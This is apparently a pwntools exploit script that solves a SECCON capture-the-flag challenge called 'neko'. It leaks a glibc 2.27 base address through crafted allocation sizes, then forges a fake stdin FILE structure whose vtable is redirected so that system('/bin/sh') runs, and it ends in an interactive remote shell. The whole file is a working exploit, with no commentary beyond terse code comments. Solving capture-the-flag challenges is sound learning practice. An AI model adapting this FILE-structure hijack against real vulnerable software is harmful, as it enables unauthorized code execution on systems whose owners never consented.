#!/usr/bin/env python
 
#encoding: utf-8;
 
 
 
from pwn import *
 
import sys
 
 
 
FILENAME = "./chall"
 
LIBCNAME = "./libc-2.27.so"
 
 
 
hosts = ("pwn-neko.chal.seccon.jp","localhost","localhost")
 
ports = (9003,12300,23947)
 
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
 
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
 
context(os='linux',arch='amd64')
 
binf = ELF(FILENAME)
 
libc = ELF(LIBCNAME) if LIBCNAME!="" else None
 
 
 
 
 
## utilities #########################################
 
 
 
note =" " 
 
enpitu = "✏️ "
 
trash = "🗑️ "
 
eye = "👀"
 
 
 
def hoge(ix):
 
  global c
 
  c.recvuntil(">")
 
  c.sendline(str(ix))
 
 
 
def a(csize, rsize, data, ret=False):
 
  if ret:
 
    c.sendline(str(1))
 
    c.sendline(str(csize))
 
    c.sendline(str(rsize))
 
    c.sendline(data)
 
    return
 
  hoge(1)
 
  c.recvuntil("alloc size: ")
 
  c.sendline(str(csize))
 
  c.recvuntil("read size: ")
 
  c.sendline(str(rsize))
 
  c.recvuntil("data: ")
 
  c.sendline(data)
 
 
 
## exploit ###########################################
 
 
 
 
 
def exploit():
 
  global c
 
  big_size = 0x40300
 
  mmap_dif = 0x1f7760
 
 
 
  if False: # my libc
 
    a(big_size, mmap_dif+0x11-0x10, "A"*0x10) # read_end
 
    a(big_size, big_size+0x10+0xcd0+0x20 + mmap_dif + 0x11, "A"*0x10, True)
 
    libc_dif = 0x1b85b0
 
  else:
 
    mmap_dif += 0x235ff0+0x10
 
    a(big_size, mmap_dif+0x1,  "A"*0x10)
 
    a(big_size, big_size + mmap_dif+0xcd0+0x1+0x40,  "A"*0x10, ret=True)
 
    libc_dif = 0x1b85b0 + 0x235300
 
 
 
  libcbase = unpack(c.recvuntil(p8(0x7f))[-6:].ljust(8,'\x00')) - libc_dif
 
  print("[+] libcbase: "+hex(libcbase))
 
 
 
  # make stdin->buf_end into stdin itself
 
  if False: # mylibc
 
    a(big_size, (big_size+0x20+0xcd0)*2 + mmap_dif + 0x11 + 0x38- 0xd60, "A"*0x10) # stdin->buf_end
 
  else:
 
    a(big_size, (big_size+0x20+0xcd0)*2 + mmap_dif + 0x11 + 0x38- 0xd60, "A"*0x10) # stdin->buf_end
 
 
 
  # forge fake stdin
 
  stdin = libcbase + libc.symbols["_IO_2_1_stdin_"]
 
  pay2 = b""
 
  pay2 += p64(0) # flag
 
  pay2 += p64(stdin) # read_ptr
 
 
 
  pay2 += p64(libcbase + 0xbeef) # read_end should be smaller than read_ptr
 
  pay2 += p64(stdin) # read_base
 
  pay2 += p64(stdin) # write_base
 
 
 
  pay2 += p64((libcbase+0x1b40fa-0x64)//2) # write_ptr binsh
 
  pay2 += p64(stdin) # write_end
 
 
 
  pay2 += p64(0) # buf_base
 
  pay2 += p64((libcbase+0x1b40fa-0x64)//2) # buf_end
 
  pay2 += p64(0)*0x12
 
  pay2 += p64(libcbase + libc.symbols["_IO_file_jumps"]+0xc0 - 0x10) # _IO_str_jmps
 
  pay2 += p64(libcbase + libc.symbols["system"]) # system 
 
  pay2 = pay2.ljust(0x100,'\x00')
 
 
 
 
 
  pay = b""
 
  pay += p64(0xfbad208b) # flag
 
  pay += p64(stdin) # read_ptr
 
 
 
  pay += p64(libcbase + 0xbeef) # read_end should be smaller than read_ptr
 
  pay += p64(stdin) # read_base
 
  pay += p64(stdin) # write_base
 
  pay += p64(stdin) # write_ptr
 
  pay += p64(stdin) # write_end
 
 
 
  pay += p64(stdin) # buf_base
 
  pay += p64(stdin+len(pay2)) # buf_end
 
  pay = pay.ljust(0x84,'\x00')
 
  pay += pay2
 
  c.sendline(pay)
 
 
 
 
 
## main ##############################################
 
 
 
if __name__ == "__main__":
 
    global c
 
    
 
    if len(sys.argv)>1:
 
      if sys.argv[1][0]=="d":
 
        cmd = """
 
          set follow-fork-mode parent
 
        """
 
        c = gdb.debug(FILENAME,cmd)
 
      elif sys.argv[1][0]=="r":
 
        c = remote(rhp1["host"],rhp1["port"])
 
      elif sys.argv[1][0]=="v":
 
        c = remote(rhp3["host"],rhp3["port"])
 
    else:
 
        c = remote(rhp2['host'],rhp2['port'])
 
    exploit()
 
    c.interactive()
